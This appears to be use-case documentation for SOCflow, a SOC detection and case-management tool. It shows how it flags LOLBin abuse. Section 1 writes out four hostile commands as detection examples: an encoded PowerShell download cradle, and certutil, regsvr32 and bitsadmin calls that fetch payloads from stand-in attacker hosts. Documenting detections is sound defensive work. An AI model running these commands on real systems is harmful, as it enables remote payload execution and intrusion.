# SOCflow Use Cases & Operational Scenarios

This document outlines the real-world operational use cases, threat detection scenarios, and role-based incident workflows supported by **SOCflow**.

---

## 1. Threat Detection Scenarios (Living-off-the-Land)

### Use Case 1: Fileless PowerShell Download Cradle (MITRE T1059.001)
* **Attack Narrative**: An adversary compromises a machine via spearphishing and launches PowerShell in hidden mode to fetch and execute an external second-stage payload straight into memory without writing a file to disk.
* **Malicious Command**:
  ```powershell
  powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiaAB0AHQAcAA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAuAGMAbwBtAC8AcABheWxvYWQucHMxIikA
  ```
* **SOCflow Detection Flow**:
  1. Sysmon captures Event ID 1 on the endpoint.
  2. Agent forwards the event; detection engine matches Rule #2 (PowerShell Encoded Command) and Rule #3 (PowerShell Download Cradle).
  3. Base score 75 is boosted by `-enc` switch, `-W Hidden` flag, and Base64 length -> **Confidence Score: 95 (Critical)**.
  4. Real-time alert triggers on the dashboard: `[CRITICAL] PowerShell Download Cradle Detected on Workstation-04`.

---

### Use Case 2: Ingress Tool Transfer via Certutil (MITRE T1105)
* **Attack Narrative**: The attacker needs to download an executable tool (e.g. `mimikatz.exe`) to the system. Knowing antivirus flags suspicious downloaders, they misuse the trusted Windows Certificate Utility (`certutil.exe`).
* **Malicious Command**:
  ```cmd
  certutil.exe -urlcache -split -f https://attacker-c2.net/tools/mimi.exe C:\Windows\Temp\mimi.exe
  ```
* **SOCflow Detection Flow**:
  1. Detection engine inspects binary `certutil.exe`.
  2. Rule #1 matches arguments `-urlcache`, `-split`, `-f` and URL prefix `https://`.
  3. Destination directory check identifies writable `C:\Windows\Temp\` location.
  4. Engine computes **Confidence Score: 90 (High/Critical)**.
  5. Alert is recorded in `soc_alert_reference` and displayed to the on-duty analyst.

---

### Use Case 3: Proxy Execution via Regsvr32 / Squiblydoo (MITRE T1218.010)
* **Attack Narrative**: Adversary uses `regsvr32.exe` to execute a remote scriptlet (.sct) hosted on an external server, bypassing application whitelisting policies (AppLocker).
* **Malicious Command**:
  ```cmd
  regsvr32.exe /s /n /u /i:http://evil.com/script.sct scrobj.dll
  ```
* **SOCflow Detection Flow**:
  1. Detection engine detects `regsvr32.exe` executed with `/i:http` pointing to an external web resource and utilizing `scrobj.dll`.
  2. Rule #6 fires with targeted technique **T1218.010 (Regsvr32 Proxy Execution)**.
  3. Threat score calculates to **88 (High)**.
  4. System generates immediate incident triage candidate.

---

### Use Case 4: Stealthy Background Transfer via BITSAdmin (MITRE T1197)
* **Attack Narrative**: The adversary configures the Windows Background Intelligent Transfer Service (`bitsadmin.exe`) to slowly exfiltrate sensitive files or stage payloads asynchronously during off-peak hours.
* **Malicious Command**:
  ```cmd
  bitsadmin.exe /transfer myJob /download /priority high http://remote-stage.org/backdoor.dll C:\Users\Public\backdoor.dll
  ```
* **SOCflow Detection Flow**:
  1. Rule #8 catches binary `bitsadmin.exe` with switches `/transfer` and `/download`.
  2. High-priority transfer combined with target path `C:\Users\Public\` yields **Confidence Score: 78 (High)**.
  3. Alert is created, and endpoint host metrics indicate abnormal background activity.

---

## 2. Role-Based User Workflows

### 2.1. SOC Analyst Workflow (Threat Triage & Incident Handling)

```
[ Step 1: Alert Detection ]
       │
       ▼
[ Step 2: Alert Review & Context ]  ---> Inspect Command Line, Parent Process, User, Host
       │
       ▼
[ Step 3: Acknowledge Alert ]      ---> Moves status from 'new' to 'open'
       │
       ▼
[ Step 4: Pivot to Log Explorer ]  ---> Queries `soc_process_event` for neighboring events
       │
       ▼
[ Step 5: Case Creation / Link ]   ---> Bundles alerts into an Incident Case with severity & notes
       │
       ▼
[ Step 6: Case Closure ]           ---> Assigns root cause, marks status 'closed', logs to audit
```

* **Alert Triage**:
  - Filter by Severity (Critical, High, Medium) or Host.
  - Acknowledge alerts to indicate active investigation, preventing duplicate work among analysts.
* **Incident Pivot via Log Explorer**:
  - Filter events by `host_id`, `process_name`, `user_name`, or exact timestamp windows.
  - Inspect parent-child relationships (e.g. `explorer.exe -> cmd.exe -> powershell.exe -> certutil.exe`).
* **Case Management**:
  - Create cases with custom titles, description, priority, and assigned analyst.
  - Link multiple alerts belonging to the same attack chain.
  - Document forensic findings in case notes with timestamped analyst entries.

---

### 2.2. SOC Manager Workflow (Administration & Security Governance)

* **Fleet Onboarding & Host Oversight**:
  - Generate and revoke endpoint enrollment keys.
  - Monitor health statuses of enrolled endpoints (`active`, `offline`, `unresponsive`).
  - Track fleet CPU, RAM, and disk utilization via real-time telemetry metrics.
* **Detection Rule Tuning & Optimization**:
  - Review detection rule performance and false positive rates.
  - Safely disable or reconfigure rules (e.g. disabling Rule #1 if administrative maintenance legitimately invokes `certutil`).
  - Update scoring weights and pattern keywords.
* **Compliance & Audit Logging**:
  - Access the immutable `soc_audit_log` tracking all system actions: user log-ins, role changes, rule edits, case closures, and agent enrollments.
* **Security Reporting**:
  - Generate and export executive summary reports covering alert trends, top affected hosts, and MITRE ATT&CK coverage distribution.

---

## 3. False Positive Suppression Use Case

* **Problem**: In corporate environments, scheduled administrative scripts (e.g. backup tools or software deployment systems) frequently execute legitimate commands that resemble LOLBin syntax.
* **SOCflow Solution**:
  1. If a developer runs an internal task where arguments score below 40 points, the detection engine does not wake up or distract the SOC analyst.
  2. The alert is saved directly with status `closed` / `suppressed`.
  3. The event remains fully queryable in the **Log Explorer** for audit purposes, ensuring zero forensic data loss while maintaining high analyst productivity.
